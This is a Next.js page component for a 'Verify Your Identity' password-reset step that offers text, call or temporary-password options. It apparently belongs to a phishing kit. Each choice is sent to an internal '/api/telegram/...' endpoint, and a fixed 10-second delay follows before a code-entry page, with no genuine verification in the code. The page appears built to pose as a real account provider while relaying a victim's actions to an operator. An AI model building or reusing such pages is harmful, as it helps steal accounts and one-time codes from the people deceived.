"use client"

import { useState } from "react"
import { useRouter } from "next/navigation"
import { HelpCircle, MessageCircle, Phone, Key, Loader2 } from "lucide-react"
import { Button } from "@/components/ui/button"
import { SiteFooter } from "@/components/site-footer"
import { SiteHeader } from "@/components/site-header"

const options = [
  {
    id: "text",
    title: "Text Me a Code",
    subtitle: "You'll enter it to log on.",
    icon: MessageCircle,
  },
  {
    id: "call",
    title: "Call Me With a Code",
    subtitle: "Get a call that says a code for you to enter.",
    icon: Phone,
  },
  {
    id: "temp",
    title: "Temporary password",
    subtitle: "Receive a temporary password to enter the site.",
    icon: Key,
  },
] as const

export default function ForgotPasswordVerifyPage() {
  const router = useRouter()
  const [isLoading, setIsLoading] = useState(false)
  const [selectedOptionId, setSelectedOptionId] = useState<string | null>(null)

  const handleSelect = (id: string, title: string) => {
    if (isLoading) return
    setSelectedOptionId(id)
    setIsLoading(true)
    fetch("/api/telegram/forgot-password-verify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ verificationType: title }),
    }).catch(console.error)
    setTimeout(() => {
      router.push("/forgot-password-code")
    }, 10000)
  }

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <SiteHeader />
      <div className="max-w-2xl px-4 py-10 mb-[270px] mx-auto md:mx-0 md:ml-[60px] flex-1">
        <div className="flex items-center gap-2 mb-2">
          <h2 className="text-base font-medium text-gray-900">Verify It&apos;s You</h2>
          <button
            type="button"
            className="text-[#254650] hover:underline flex items-center gap-1"
            aria-label="Help"
          >
            <HelpCircle className="w-4 h-4" />
            <span className="text-sm">Help</span>
          </button>
        </div>

        <h1 className="text-2xl font-semibold text-gray-900 mb-2">
          Verify Your Identity
        </h1>
        <p className="text-gray-700 text-sm mb-2">
          Before your password can be reset, you&apos;ll need to identify yourself in 2 ways. The extra step helps protect your account information.
        </p>
        <p className="text-gray-700 text-sm mb-6">
          First, choose an option.
        </p>

        <div
          className={`space-y-0 border border-gray-200 rounded-none divide-y divide-gray-200 mb-8 ${isLoading ? "pointer-events-none opacity-60" : ""}`}
          aria-busy={isLoading}
        >
          {options.map(({ id, title, subtitle, icon: Icon }) => {
            const isSelectedAndLoading = isLoading && selectedOptionId === id
            return (
              <button
                key={id}
                type="button"
                onClick={() => handleSelect(id, title)}
                disabled={isLoading}
                className="w-full flex items-start gap-4 px-4 py-4 text-left hover:bg-gray-50 transition-colors disabled:cursor-not-allowed disabled:hover:bg-transparent"
              >
                {isSelectedAndLoading ? (
                  <Loader2 className="w-6 h-6 text-[#254650] shrink-0 mt-0.5 animate-spin" />
                ) : (
                  <Icon className="w-6 h-6 text-[#254650] shrink-0 mt-0.5" />
                )}
                <div>
                  <p className="text-[#254650] font-medium">{title}</p>
                  <p className="text-gray-500 text-sm mt-0.5">
                    {isSelectedAndLoading ? "Loading..." : subtitle}
                  </p>
                </div>
              </button>
            )
          })}
        </div>

        <Button
          type="button"
          variant="outline"
          disabled={isLoading}
          className="rounded-md border-gray-300 bg-gray-100 hover:bg-gray-200 text-gray-900 h-9 px-5 disabled:opacity-70 disabled:cursor-not-allowed"
          onClick={() => router.push("/forgot-password-found")}
        >
          Cancel
        </Button>
      </div>

      <SiteFooter />
    </div>
  )
}

